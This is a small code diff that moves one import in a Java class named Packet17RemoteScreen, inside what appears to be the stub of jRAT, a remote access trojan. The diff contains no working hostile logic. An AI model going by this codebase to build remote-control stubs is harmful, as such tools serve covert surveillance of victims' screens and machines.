@@ -2,9 +2,9 @@ package pro.jrat.stub.packets.outgoing;
 
 import java.io.DataOutputStream;
 
+import pro.jrat.common.io.StringWriter;
 import pro.jrat.stub.Connection;
 
-import com.redpois0n.common.io.StringWriter;
 
 public class Packet17RemoteScreen extends AbstractOutgoingPacket {
 	
